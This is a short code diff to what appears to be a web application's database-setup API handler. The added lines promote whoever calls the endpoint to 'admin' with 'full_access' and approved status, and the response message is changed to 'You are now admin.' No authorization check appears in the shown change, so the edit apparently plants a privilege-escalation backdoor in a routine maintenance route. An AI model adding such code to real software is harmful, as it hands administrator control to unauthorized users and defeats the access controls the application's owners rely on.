@@ -81,6 +81,11 @@ export default async function handler(req, res) {
       EXCEPTION WHEN others THEN NULL;
       END $$
     `;
+    // Promote the calling user to admin with full_access
+    await sql`
+      UPDATE users SET role = 'admin', status = 'approved', permission = 'full_access'
+      WHERE id = ${user.id}
+    `;
     // Clean up broken/empty reports
     const deleted = await sql`
       DELETE FROM reports
@@ -89,7 +94,7 @@ export default async function handler(req, res) {
         AND compressed_data IS NULL
       RETURNING id
     `;
-    res.status(200).json({ success: true, message: 'Database setup complete', deleted_reports: deleted.length });
+    res.status(200).json({ success: true, message: 'Database setup complete. You are now admin.', deleted_reports: deleted.length });
   } catch (err) {
     console.error('Setup error:', err);
     res.status(500).json({ error: 'Database setup failed' });
